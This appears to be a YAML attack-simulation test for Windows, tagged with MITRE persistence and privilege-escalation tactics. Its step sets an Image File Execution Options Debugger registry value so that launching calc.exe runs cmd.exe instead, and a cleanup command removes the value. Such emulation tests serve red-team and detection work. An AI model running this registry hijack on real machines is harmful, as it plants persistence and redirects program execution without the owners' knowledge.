api_version: "2.0"
name: IFEO Add Debugger
description: |
    Leverage Global Flags Settings
args:
    - name: target_binary
      type: path
      default: calc.exe
    - name: payload_binary
      type: path
      default: C:\Windows\System32\cmd.exe
uuid: fdda2626-5234-4c90-b163-60849a24c0b8
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.012: Image File Execution Options Injection'
requirements:
    platforms:
        - os: windows
steps:
    - name: ifeo-add-debugger
      inline: |
        REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{{.Args.target_binary}}" /v Debugger /d "{{.Args.payload_binary}}"
      executor: command_prompt
      cleanup:
        inline: |
            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{{.Args.target_binary}}" /v Debugger /f >nul 2>&1
        executor: command_prompt
